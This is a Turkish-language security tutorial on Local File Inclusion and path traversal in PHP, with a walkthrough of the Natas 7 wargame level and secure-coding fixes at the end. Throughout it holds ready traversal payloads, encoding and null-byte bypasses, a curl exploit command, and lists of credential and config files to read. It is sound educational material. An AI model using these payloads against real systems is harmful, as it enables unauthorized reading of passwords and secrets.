# 🌐 Web Güvenliği — Local File Inclusion (LFI) & Path Traversal

> Uygulama hangi dosyayı göstereceğini senden soruyorsa,
> sen de istediğin dosyayı söyleyebilirsin.

---

## 📋 İçindekiler

- [Path Traversal Nedir?](#path-traversal-nedir)
- [LFI Nedir?](#lfi-nedir)
- [../  ile Dizin Gezimi](#-ile-dizin-gezimi)
- [Hedef Dosyalar](#hedef-dosyalar)
- [Filtre Bypass Teknikleri](#filtre-bypass-teknikleri)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## Path Traversal Nedir?

Uygulama bir dosyanın yolunu kullanıcıdan alıyorsa ve bunu doğrulamıyorsa, kullanıcı `../` dizileriyle dosya sisteminde yukarı çıkabilir ve yetkisiz dosyalara erişebilir.

```
Normal istek:
  ?file=welcome.txt
  /var/www/html/files/welcome.txt  ✓

Path Traversal:
  ?file=../../../../etc/passwd
  /var/www/html/files/../../../../etc/passwd
  → /etc/passwd  ✓ (sunucu bunu okur)
  # /var/www/html/files/ köke göre 4 seviye derin → köke çıkmak için 4 adet ../ gerekir
  # (3 adet ../ yalnızca /var'a çıkar ve /var/etc/passwd verir)
```

Bu atak hem yerel dosyaları okumak (LFI) hem de uzak kaynaklar için (RFI) kullanılabilir.

---

## LFI Nedir?

**Local File Inclusion**, `include()` veya `require()` gibi PHP fonksiyonlarının kullanıcı girdisiyle kontrol edildiği durumlarda ortaya çıkar.

```php
// Tehlikeli kod:
$page = $_GET['page'];
include($page);
```

Kullanıcı `page=welcome.php` yazarsa uygulama `welcome.php` dosyasını include eder. Ama `page=../../../../etc/passwd` yazarsa `/etc/passwd` dosyasını include eder — ve içeriğini ekrana basar.

### Path Traversal vs LFI Farkı

| | Path Traversal | LFI |
|--|----------------|-----|
| Fonksiyon | `file_get_contents`, `readfile`, `fopen` | `include`, `require` |
| Sonuç | Dosya içeriği okunur | Dosya PHP olarak çalıştırılır (veya okunur) |
| Tehlike | Dosya okuma | Dosya okuma + kod çalıştırma |

Pratikte ikisi birlikte kullanılır ve Natas'ta her ikisi de "dosya okuma" olarak karşımıza çıkar.

---

## ../ ile Dizin Gezimi

Unix dosya sisteminde:

```
.   → mevcut dizin
..  → bir üst dizin
/   → kök dizin
```

```
/var/www/html/pages/          ← uygulama buradan include ediyor
          ↑
          Bir üst: /var/www/html/
          İki üst: /var/www/
          Üç üst:  /var/
          Dört üst: /
```

Kaç tane `../` gerektiğini bilmiyorsan, fazla eklemek zarar vermez:

```
../../../../../../../../etc/passwd
```

Kök dizine ulaştıktan sonra fazla `../` görmezden gelinir — `/../../etc/passwd` yine `/etc/passwd` olur.

### Adım Adım

```
Uygulama yolu: /var/www/html/pages/
Hedef dosya:   /etc/natas_webpass/natas8

Fark:
  /var/www/html/pages/ → 4 üst gitmeliyim → ../../../../
  Sonra: etc/natas_webpass/natas8

Payload: ../../../../etc/natas_webpass/natas8
```

---

## Hedef Dosyalar

LFI/Path Traversal ile okunmaya çalışılan yaygın dosyalar:

### Linux Sistem Dosyaları

```
/etc/passwd              → kullanıcı listesi
/etc/shadow              → şifre hash'leri (root yetkisi gerekir)
/etc/hosts               → host dosyası
/etc/hostname            → sunucu adı
/proc/self/environ       → ortam değişkenleri (log poisoning için)
/proc/version            → kernel versiyonu
```

### Web Sunucusu Dosyaları

```
/etc/apache2/apache2.conf       → Apache ayarları
/etc/nginx/nginx.conf           → Nginx ayarları
/var/log/apache2/access.log     → Apache erişim logu (log poisoning)
/var/log/apache2/error.log      → Apache hata logu
```

### PHP / Uygulama Dosyaları

```
/var/www/html/config.php        → veritabanı şifresi
/var/www/html/.env              → ortam değişkenleri
../config/database.php          → DB bağlantı bilgisi
```

### Natas'a Özel

```
/etc/natas_webpass/natas[X]     → levelların şifreleri burada
```

---

## Filtre Bypass Teknikleri

Uygulama `../` karakterlerini veya hedef yolları filtreleyebilir.

### 1. Fazla ../  Eklemek

Kaç üst dizin olduğunu bilmiyorsan:

```
../../../../../../../../../../../../etc/passwd
```

### 2. URL Encoding

```
../     →   %2e%2e%2f
../     →   ..%2f
../     →   %2e%2e/
```

Çift encoding:

```
../     →   %252e%252e%252f    (% → %25)
```

### 3. Null Byte (PHP 5.3 ve öncesi)

Eski PHP sürümlerinde `%00` (null byte) string'i sonlandırır:

```php
include($page . ".php");

// Payload:
?page=../../../../etc/passwd%00
// → include("/etc/passwd\0.php") → /etc/passwd okunur
```

> Not: PHP 5.3.4+ sürümlerinde bu çalışmaz.

### 4. Path Normalization Bypass

```
....//....//etc/passwd      # // normalize edilir ama .... çift .. gibi davranabilir
..././..././etc/passwd       # bazı filtrelerde
```

### 5. Encoding Kombinasyonları

```
%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd
```

### 6. Absolute Path (Mutlak Yol)

Uygulama sadece `../` filtreliyorsa ve mutlak yolu kabul ediyorsa:

```
?page=/etc/passwd
?page=/etc/natas_webpass/natas8
```

---

## Natas'ta Kullanım

### Natas 7 — Temel LFI

**Kaynak kod:**

```php
<?php
// Hint: password for webuser natas8 can be found in /etc/natas_webpass/natas8
?>
<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<?php
if(array_key_exists("page", $_REQUEST) && !is_null($_REQUEST["page"])) {
    include($_REQUEST["page"]);
}
?>
```

**Analiz:**

- `page` parametresi doğrudan `include()` fonksiyonuna gidiyor
- Hiçbir filtreleme yok
- Şifre `/etc/natas_webpass/natas8` konumunda

**Exploit:**

```
URL: http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

Mutlak yol doğrudan çalışıyor — `../` bile gerekmiyor.

**curl ile:**

```bash
curl -u natas7:[şifre] \
     "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
```

**Öğrenilen:** `include($_GET['page'])` kullanımı LFI'nın en basit halidir. Hiçbir filtreleme yoksa mutlak yol doğrudan işe yarar.

---

### Kaç ../ Gerektiğini Hesaplamak

```
Uygulama dizini: /var/www/html/
                 ^   ^   ^   ^
                 1   2   3   4. seviye

Hedef: /etc/natas_webpass/natas8

/var/www/html/ → 3 üst git → /
../../../../etc/natas_webpass/natas8
^ 4 tane (fazlası zarar vermez)
```

Emin değilsen:

```
../../../../../../../../../../../../../../etc/natas_webpass/natas8
```

---

### LFI — Kontrol Listesi

```
Kaynak kodda kontrol et:
  ☐ include(), require(), include_once(), require_once() var mı?
  ☐ file_get_contents(), readfile(), fopen() var mı?
  ☐ Parametre doğrudan bu fonksiyona gidiyor mu?
  ☐ Filtreleme var mı? Neler filtreliyor?

URL'de kontrol et:
  ☐ ?page=, ?file=, ?path=, ?template= gibi parametreler var mı?
  ☐ Mutlak yol dene: ?page=/etc/passwd
  ☐ ../  ile dene: ?page=../../../../etc/passwd
  ☐ URL encode dene: ?page=..%2F..%2Fetc%2Fpasswd

Hedef:
  ☐ /etc/natas_webpass/natas[X] (Natas için)
  ☐ /etc/passwd (sistemi tanımak için)
  ☐ Kaynak php dosyaları (config.php, index.php)
```

---

### Güvenli Kod Nasıl Olmalı?

```php
// KÖTÜ
$page = $_GET['page'];
include($page);

// İYİ — whitelist (izin listesi) kullan
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed)) {
    include($page . '.php');
} else {
    include('home.php');
}

// DAHA İYİ — realpath ile normalize et ve kontrol et
$page = realpath('/var/www/html/pages/' . $_GET['page']);
$base = '/var/www/html/pages/';

if (strpos($page, $base) === 0) {
    include($page);
}
```

---

## 🔗 Kaynaklar

- [PortSwigger — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [PortSwigger — File Inclusion](https://portswigger.net/web-security/file-path-traversal)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PayloadsAllTheThings — LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---

**Önceki konu:** [07_command_injection.md](./07_command_injection.md)
**Sonraki konu:** [09_xor_sifrelemesi.md](./09_xor_sifrelemesi.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
